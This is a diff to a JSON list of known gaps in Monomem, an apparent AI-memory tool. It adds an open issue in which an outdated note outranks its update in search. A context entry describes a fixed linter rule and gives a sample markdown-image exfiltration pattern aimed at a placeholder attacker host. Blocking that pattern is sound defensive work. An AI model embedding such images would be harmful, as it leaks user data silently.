@@ -34,5 +34,10 @@
     "summary": "Fixed in 2.0.0: the write-time linter holds a note in quarantine when it carries a markdown image (it loads by itself when rendered) pointing at a remote address with a query string, such as ![x](https://attacker/pixel?data=...). README badge hosts (img.shields.io, badgen.net, badge.fury.io, codecov.io) are exempt. Plain links need a click and are not flagged.",
     "status": "fixed",
     "fixed_in": "2.0.0"
+  },
+  "GAP-OBSOLETE-UNREPLACED": {
+    "title": "An unreplaced obsolete fact can rank above its update",
+    "summary": "Found in 1.5.0 (C-07, scenario A33). When a later note updates a fact in different words and nobody replaces or edits the old note, keyword search and the 'what is relevant' lookup rank the old note first: it matches the query as well and is shorter, so BM25 scores it higher, and the newest-first rule only breaks exact ties. The SessionStart injection does carry the new value. Replacing the old note (preview, then confirm) removes the old value everywhere (A34). Monomem deliberately does not guess that one note replaces another.",
+    "status": "open"
   }
 }
